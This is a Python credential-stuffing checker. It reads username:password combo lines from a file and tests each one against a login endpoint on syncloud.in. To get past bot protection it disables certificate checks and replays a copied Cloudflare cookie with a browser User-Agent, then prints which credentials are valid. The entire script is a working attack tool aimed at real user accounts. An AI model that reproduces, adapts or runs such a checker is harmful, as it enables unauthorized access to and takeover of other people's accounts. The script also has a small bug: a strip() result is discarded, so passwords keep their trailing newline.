import requests, os, json, urllib3
from time import sleep

urllib3.disable_warnings()

config = json.loads(open("config.json", "r").read())

os.system('cls')

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def Login(user, password):
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Host": "syncloud.in",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Cookie": config["cookie"],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
    }

    if config["cookie"] == "" or "cf_" not in config["cookie"]:
        print(f"[{bcolors.OKBLUE}INFO{bcolors.ENDC}] Invalid cookie in config.json\n")
        return
    
    url = f"https://syncloud.in/pauth/pxlwrk.php?action=lf_tps&login={user}&password={password}"
    r = requests.get(url, headers=headers, verify=False)

    if "Invalid_Login_Or_Password" in r.text:
        print(f"[{bcolors.FAIL}INVALID{bcolors.ENDC}] {user}:{password}\n")
    elif "OK_DLG" in r.text:
        print(f"[{bcolors.OKGREEN}VALID{bcolors.ENDC}] {user}:{password}\n")
    else:
        print(f"[{bcolors.OKBLUE}INFO{bcolors.ENDC}] Navigate to 'https://syncloud.in/pauth/pxlwrk.php?action=lf_tps' and set a new cookie in the config.json\n")
        print(f"[{bcolors.FAIL}REQUEST ERROR{bcolors.ENDC}] Status Code: {r.status_code}\nData: {r.text}\n")

pxcombo = None
if pxcombo == None:
    try:
        pxcombo = open("pxcombo.txt", "r").readlines()
    except Exception as e:
        print(f"[{bcolors.FAIL}ERROR{bcolors.ENDC}] {e}")

for line in pxcombo:
    line.strip()
    try:
        username = line.split(":")[0]
        if not username.startswith("pxau"):
            print(f"[{bcolors.FAIL}FORMAT{bcolors.ENDC}] Invalid username '{username}', does not start with 'pxau'\n")
            continue

        password = line.split(":")[1]
        print(f"[{bcolors.OKBLUE}TRYING{bcolors.ENDC}] {username}:{password}")
        Login(username, password)
    except Exception as e:
        print(f"[{bcolors.FAIL}ERROR{bcolors.ENDC}] {e}\n")